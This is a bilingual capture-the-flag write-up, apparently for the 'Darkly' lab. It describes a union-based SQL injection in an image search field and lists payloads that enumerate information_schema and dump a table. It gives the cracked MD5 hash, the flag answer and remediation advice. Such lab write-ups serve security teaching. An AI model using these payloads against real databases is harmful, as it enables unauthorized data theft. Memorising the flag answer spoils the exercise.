<div align="center">

# SQL Injection - Images
### Dumping database contents via UNION-based SQL Injection

</div>

---

## 🇬🇧 English

<details>
<summary><b>📖 Click to expand/collapse English version</b></summary>

### 📖 Definition

**Union-Based SQL Injection** is a specific type of SQL injection where the UNION operator is used to combine the results of two or more SELECT statements into a single result. This allows the attacker to retrieve data from other tables that were not intended to be displayed by the original query.

### ⚡ Quick Demo

In the "Search Image" box, paste in order:
```sql
-1 UNION SELECT table_name, column_name FROM information_schema.columns
-1 UNION SELECT url, comment FROM list_images
```
Then MD5-decrypt the hash found in the comment (crackstation.net) and SHA256 it.

### 📖 Approach

In the "Search Image" section, I tested for SQL injection by inputting a standard payload like `1 OR 1=1`. It returned all images, confirmed the vulnerability. I then used `UNION SELECT` to enumerate the tables and columns.

I found a table named `list_images` (hex: `0x6C6973745F696D61676573`). Querying it revealed a special entry with a comment instructing to decrypt an MD5 hash (`1928e8083cf461a51303633093573c46`) to lowercase, then SHA256 hash it.
MD5 Decrypt -> `albatroz`. SHA256(`albatroz`) -> Flag.

**Payloads used:**
1. List tables:
   `-1 UNION SELECT table_name, NULL FROM information_schema.tables`
2. List columns:
   `-1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x6C6973745F696D61676573`
3. Dump data:
   `-1 UNION SELECT url, comment FROM list_images`

```
[
	ID: -1 UNION SELECT url, comment FROM list_images 
	Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
	Url : borntosec.ddns.net/images.png
]
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### 🛡️ Remediation

To prevent SQL Injection:
- **Prepared Statements**: Use parameterized queries (Prepared Statements) for all database access.
- **Input Validation**: Validate and sanitize all user inputs.
- **Principle of Least Privilege**: Run the database service with the minimum necessary privileges.

### 🔗 Resources

- [CrackStation](https://crackstation.net/)
- [SHA256 Online](https://emn178.github.io/online-tools/sha256.html)

</details>

---

## 🇫🇷 Français

<details>
<summary><b>📖 Cliquez pour développer/réduire la version française</b></summary>

### 📖 Définition

L'**Injection SQL basée sur UNION** est un type spécifique d'injection SQL où l'opérateur UNION est utilisé pour combiner les résultats de deux instructions SELECT ou plus en un seul résultat. Cela permet à l'attaquant de récupérer des données d'autres tables qui n'étaient pas destinées à être affichées.

### ⚡ Démo rapide

Dans le champ "Search Image", coller dans l'ordre :
```sql
-1 UNION SELECT table_name, column_name FROM information_schema.columns
-1 UNION SELECT url, comment FROM list_images
```
Puis déchiffrer le MD5 trouvé dans le commentaire (crackstation.net) et le hacher en SHA256.

### 📖 Approche

Dans la section "Search Image", j'ai testé l'injection avec `1 OR 1=1`, ce qui a retourné toutes les images. J'ai utilisé `UNION SELECT` pour énumérer les tables.

J'ai trouvé une table nommée `list_images`. En l'interrogeant, j'ai trouvé un commentaire demandant de déchiffrer un hash MD5 (`1928e8083cf461a51303633093573c46`) en minuscule, puis de le hacher en SHA256.
MD5 déchiffré -> `albatroz`. SHA256(`albatroz`) -> Flag.

**Payloads utilisés :**
1. Lister les tables :
   `-1 UNION SELECT table_name, NULL FROM information_schema.tables`
2. Lister les colonnes :
   `-1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x6C6973745F696D61676573`
3. Extraire les données :
   `-1 UNION SELECT url, comment FROM list_images`

```
[
	ID: -1 UNION SELECT url, comment FROM list_images 
	Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
	Url : borntosec.ddns.net/images.png
]
```

**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### 🛡️ Remédiation

Pour corriger cela :
- **Requêtes préparées** : Utiliser des requêtes paramétrées pour tout accès à la base de données.
- **Validation des entrées** : Valider et nettoyer toutes les entrées utilisateur.
- **Moindre privilège** : Exécuter le service de base de données avec le minimum de privilèges nécessaires.

### 🔗 Sources

- [CrackStation](https://crackstation.net/)
- [SHA256 Online](https://emn178.github.io/online-tools/sha256.html)

</details>
